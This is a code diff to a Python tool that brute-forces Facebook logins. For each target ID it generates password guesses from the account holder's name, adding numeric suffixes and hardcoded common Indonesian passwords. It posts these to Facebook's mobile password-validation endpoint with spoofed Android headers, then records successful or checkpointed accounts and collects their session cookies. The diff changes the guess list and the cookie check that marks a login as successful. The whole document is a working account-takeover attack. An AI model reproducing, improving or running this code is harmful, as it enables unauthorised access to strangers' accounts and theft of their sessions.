@@ -1003,25 +1003,17 @@ def passwrd():
 			for yuzong in id2:
 				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 				frs = nmf.split(" ")[0]
-				pwv = []
+				pwv = ['anjing123','sayangku','maling123']
 				if len(nmf)<6:
 					if len(frs)<3:
 						pass
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'1')
-						pwv.append(frs+'2')
-						pwv.append(frs+'3')
-						pwv.append(frs+'00')
-						pwv.append(frs+'01')
-						pwv.append(frs+'02')
-						pwv.append(frs+'03')
-						pwv.append(frs+'04')
-						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
-						pwv.append(frs+'09')
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'1234567')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -1076,7 +1068,7 @@ def metode_api(idf,pwv):
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=True)
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
@@ -1099,7 +1091,7 @@ def metode_api(idf,pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
-			elif "c_user" in ses.cookies.get_dict().keys():
+			elif "sb" in ses.cookies.get_dict().keys():
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
